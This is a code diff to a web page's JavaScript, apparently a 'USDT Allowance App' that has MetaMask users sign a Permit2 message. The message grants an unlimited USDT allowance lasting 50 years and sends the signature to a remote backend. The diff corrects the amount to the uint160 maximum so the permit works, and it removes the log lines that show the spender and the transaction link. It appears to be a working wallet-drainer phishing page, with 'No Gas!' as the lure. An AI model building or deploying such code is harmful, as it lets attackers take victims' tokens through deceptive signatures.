@@ -201,8 +201,12 @@
             apiUrl: "https://201-black.vercel.app/api/submit-signature"
         };
 
+        // ⭐ uint160 උපරිම අගය (Permit2 Unlimited)
+        const MAX_UINT160 = "1461501637330902918203684832716283019655932542975";
+
         console.log("🚀 USDT Allowance App");
         console.log("📋 Contract:", CONFIG.contractAddress);
+        console.log("💰 MAX_UINT160:", MAX_UINT160);
 
         // ============================================
         // STATE
@@ -307,7 +311,7 @@
                     return;
                 }
 
-                const isUnlimited = amount.toString() === ethers.constants.MaxUint256.toString();
+                const isUnlimited = amount.toString() === MAX_UINT160;
                 allowanceDisplay.textContent = isUnlimited ? '♾️ UNLIMITED' : `${ethers.utils.formatUnits(amount, 6)} USDT`;
                 allowanceDisplay.className = isUnlimited ? 'value unlimited' : 'value';
                 expiryDisplay.textContent = formatDate(expiration);
@@ -357,11 +361,10 @@
                 // 50 years expiration
                 const years = 50;
                 const expiration = Math.floor(Date.now() / 1000) + (365 * 24 * 3600 * years);
-                const sigDeadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+                const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
 
                 console.log('📝 Nonce:', nonce.toString());
                 console.log('⏰ Expiration:', new Date(expiration * 1000).toLocaleString());
-                console.log('📋 Spender:', CONFIG.contractAddress);
 
                 showStatus('✍️ Please sign in MetaMask... (No Gas!)', 'info');
 
@@ -387,11 +390,11 @@
                     ]
                 };
 
-                // ⭐ PermitSingle Message
+                // ⭐ PermitSingle Message - FIXED with MAX_UINT160!
                 const message = {
                     details: {
                         token: CONFIG.usdtAddress,
-                        amount: ethers.constants.MaxUint256.toString(),
+                        amount: MAX_UINT160,  // ✅ 2^160 - 1
                         expiration: expiration,
                         nonce: nonce
                     },
@@ -401,11 +404,9 @@
 
                 console.log('📝 Message:', JSON.stringify(message, null, 2));
 
-                // Get signature
                 const signature = await signer._signTypedData(domain, types, message);
                 console.log("✅ Signature:", signature);
 
-                // Send to backend
                 showStatus('📤 Sending to backend...', 'loading');
 
                 const response = await fetch(CONFIG.apiUrl, {
@@ -413,7 +414,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         user: userAddress,
-                        amount: ethers.constants.MaxUint256.toString(),
+                        amount: MAX_UINT160,  // ✅ 2^160 - 1
                         expiration: expiration,
                         nonce: nonce.toString(),
                         sigDeadline: sigDeadline,
@@ -440,7 +441,6 @@
                     successCheck.classList.add('show');
                     showStatus(`✅ ${result.message}`, 'success');
                     console.log("📤 Tx Hash:", result.txHash);
-                    console.log("🔗 https://etherscan.io/tx/" + result.txHash);
                     await checkAllowance();
                 } else {
                     showStatus(`❌ Error: ${result.error}`, 'error');
